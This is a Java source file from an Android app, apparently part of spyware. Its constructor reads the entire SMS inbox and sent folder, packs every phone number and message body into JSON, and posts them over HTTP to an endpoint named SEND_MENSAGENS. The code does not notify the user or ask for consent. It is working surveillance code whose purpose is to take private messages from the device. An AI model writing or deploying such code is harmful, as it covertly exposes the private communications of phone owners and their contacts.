package com.androix;


import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.gsm.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.net.URI;

/**
 * Created by Rafael on 05/10/15.
 */
public class SmsMensagens {
    private Context context;

    public SmsMensagens(Context c)
    {
        context = c;

        String sms = this.recebidos()+";"+this.enviados();

        new ConexaoHttp().post(Config.SEND_MENSAGENS, sms);
    }


    private String recebidos()
    {
        String sms = null;

        Uri inboxUri = Uri.parse("content://sms/inbox");
        String[] reqCols = new String[] { "_id", "address", "body" };
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(inboxUri, reqCols, null, null, null);

        JSONObject jSms = new JSONObject();
        JSONArray jsonArray = new JSONArray();

        while(cursor.moveToNext())
        {
            JSONObject jGroup = new JSONObject();

            String adress = cursor.getString(1);
            String body = cursor.getString(2);

            try{
                jGroup.put("numero",adress);
                jGroup.put("msg",body);

                jsonArray.put(jGroup);
                jSms.put("sms",jsonArray);
            }catch(Exception e){
                e.printStackTrace();
            }

            sms = jSms.toString();
        }

        return sms;
    }


    private String enviados()
    {
        String sms = null;

        Uri inboxUri = Uri.parse("content://sms/sent");
        String[] reqCols = new String[] { "_id", "address", "body" };
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(inboxUri, reqCols, null, null, null);

        JSONObject jSms = new JSONObject();
        JSONArray jsonArray = new JSONArray();

        while(cursor.moveToNext())
        {
            JSONObject jGroup = new JSONObject();

            String adress = cursor.getString(1);
            String body = cursor.getString(2);

            try{
                jGroup.put("numero",adress);
                jGroup.put("msg",body);

                jsonArray.put(jGroup);
                jSms.put("sms_send",jsonArray);
            }catch (Exception e){
                e.printStackTrace();
            }
            sms = jSms.toString();
        }

        return sms;
    }
}
